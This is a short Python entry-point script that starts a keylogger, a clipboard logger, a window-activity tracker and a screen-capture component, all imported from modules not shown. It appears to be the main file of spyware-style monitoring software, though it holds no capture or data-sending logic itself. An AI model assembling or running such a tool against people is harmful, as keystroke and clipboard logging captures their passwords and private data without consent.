from loggingKeystrokes import KeyLogger
from clipboardContent import ClipboardLogger
from trackWindows import ActivityTracker
from screenshotTaker import ScreenCapture


def main():

    keylogger = KeyLogger()
    clipboard = ClipboardLogger()
    activity = ActivityTracker()
    screen = ScreenCapture()

    keylogger.start()
    clipboard.start()
    activity.start()
    screen.start()

    keylogger.join()


if __name__ == "__main__":
    main()


